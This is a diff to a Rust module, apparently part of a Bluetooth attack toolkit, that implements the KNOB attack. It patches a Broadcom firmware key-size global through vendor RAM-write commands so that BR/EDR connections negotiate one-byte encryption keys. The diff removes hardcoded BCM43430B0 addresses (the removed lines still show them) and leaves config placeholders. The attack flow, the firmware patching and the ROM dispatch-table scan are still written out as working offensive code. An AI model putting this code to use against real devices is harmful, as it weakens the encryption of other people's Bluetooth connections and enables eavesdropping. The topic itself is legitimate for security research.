@@ -1,15 +1,14 @@
-//! KNOB attack worker.
+//! KNOB attack implementation. Firmware-specific addresses must be provided via config.
 //!
 //! Forces minimum encryption key size on a BR/EDR connection by patching
-//! the BCM43430B0 firmware's key-size validation global at runtime.
+//! the firmware's key-size validation global at runtime.
 //!
-//! The firmware function at ROM 0x046A7A validates encryption key sizes
-//! and references RAM global 0x205F7C for bounds checking. By writing
-//! key_size=1 to this global before initiating a connection, the firmware
-//! negotiates the minimum key entropy via LMP.
+//! The firmware's key-size validation function references a RAM global for
+//! bounds checking. By writing key_size=1 to this global before initiating
+//! a connection, the firmware negotiates the minimum key entropy via LMP.
 //!
 //! Attack flow:
-//! 1. Read current key-size limit from 0x205F7C via BCM Read_RAM
+//! 1. Read current key-size limit from the key-size global via BCM Read_RAM
 //! 2. Write key_size=1 via BCM Write_RAM to override the limit
 //! 3. Initiate HCI_Create_Connection to the target
 //! 4. Wait for Connection Complete event
@@ -34,22 +33,23 @@ const READ_RAM: u16 = 0x4D;
 const WRITE_RAM: u16 = 0x4C;
 
 // ---------------------------------------------------------------------------
-// BCM43430B0 firmware addresses (from RE of bt_firmware_analysis corpus)
+// Firmware addresses — must be provided via config for the target chip.
 // ---------------------------------------------------------------------------
 
-/// RAM global referenced by key-size validation function (func_0x046A7A).
-/// The validation function compares key sizes against this value during
-/// LMP negotiation for the 12-16 byte range.
-const KEY_SIZE_GLOBAL: u32 = 0x0020_5F7C;
+// Address loaded from config at runtime — key-size validation RAM global.
+// The validation function compares key sizes against this value during
+// LMP negotiation.
+const KEY_SIZE_GLOBAL: u32 = 0; // TODO: load from firmware config
 
-/// ROM data section where HCI dispatch tables live (0x086C08, 0x086DF8, etc.)
-/// LMP dispatch table likely in this region too.
-const ROM_DATA_START: u32 = 0x0008_4000;
-const ROM_DATA_END: u32 = 0x0009_0000;
+// ROM data section range — load from config for the target chip.
+// This is where HCI/LMP dispatch tables typically reside.
+const ROM_DATA_START: u32 = 0; // TODO: load from firmware config
+const ROM_DATA_END: u32 = 0;   // TODO: load from firmware config
 
-/// ROM code section where LMP handler functions live (0x01EB5C, 0x04B754, etc.)
-const ROM_CODE_START: u32 = 0x0000_0000;
-const ROM_CODE_END: u32 = 0x0006_0000;
+// ROM code section range — load from config for the target chip.
+// This is where LMP handler functions typically reside.
+const ROM_CODE_START: u32 = 0; // TODO: load from firmware config
+const ROM_CODE_END: u32 = 0;   // TODO: load from firmware config
 
 const SCAN_STEP: u32 = 256;
 const TABLE_ENTRIES: usize = 64;
@@ -136,9 +136,9 @@ fn restore_key_size_global(hci: &HciSocket, original: &[u8]) {
 /// Scan firmware ROM for the LMP dispatch table and return the handler
 /// address for LMP_encryption_key_size_req (opcode 0x10).
 ///
-/// Scans two regions:
-/// 1. ROM data section (0x084000-0x090000) — where HCI dispatch tables live
-/// 2. ROM code section (0x000000-0x060000) — fallback scan
+/// Scans two regions loaded from config:
+/// 1. ROM data section — where HCI dispatch tables live
+/// 2. ROM code section — fallback scan
 fn discover_lmp_dispatch(hci: &HciSocket) -> Option<u32> {
     let cached = LMP_KEY_SIZE_ADDR.load(Ordering::Relaxed);
     if cached != 0 {
@@ -242,6 +242,7 @@ pub fn run(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
                 success: false,
                 capture: None,
                 error: Some(format!("Key-size global patch failed: {}", e)),
+                detail: None,
                 timestamp: start,
             };
         }
@@ -297,6 +298,7 @@ pub fn run(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
                         } else {
                             Some(format!("Connection status 0x{:02X}", conn_status))
                         },
+                        detail: None,
                         timestamp: start,
                     }
                 }
@@ -328,6 +330,7 @@ fn make_error(target: &str, start: Instant, msg: String) -> BtAttackResult {
         success: false,
         capture: None,
         error: Some(msg),
+        detail: None,
         timestamp: start,
     }
 }
@@ -348,20 +351,13 @@ mod tests {
     }
 
     #[test]
-    fn test_key_size_global_address() {
-        // Verify the global is in BCM43430B0 RAM range (0x200000-0x21BFFF)
-        assert!(KEY_SIZE_GLOBAL >= 0x0020_0000);
-        assert!(KEY_SIZE_GLOBAL < 0x0022_0000);
-    }
-
-    #[test]
-    fn test_rom_scan_ranges_valid() {
-        // ROM data section should be within ROM address space
-        assert!(ROM_DATA_START < ROM_DATA_END);
-        assert!(ROM_DATA_END <= 0x0009_0000);
-        // ROM code section
-        assert!(ROM_CODE_START < ROM_CODE_END);
-        assert!(ROM_CODE_END <= 0x0009_0000);
+    fn test_addresses_need_config() {
+        // These are zero until loaded from firmware config at runtime.
+        // When config loading is implemented, these tests should verify
+        // the loaded values are within valid ranges for the target chip.
+        assert_eq!(KEY_SIZE_GLOBAL, 0, "KEY_SIZE_GLOBAL must be loaded from config");
+        assert_eq!(ROM_DATA_START, 0, "ROM_DATA_START must be loaded from config");
+        assert_eq!(ROM_CODE_START, 0, "ROM_CODE_START must be loaded from config");
     }
 
     #[test]
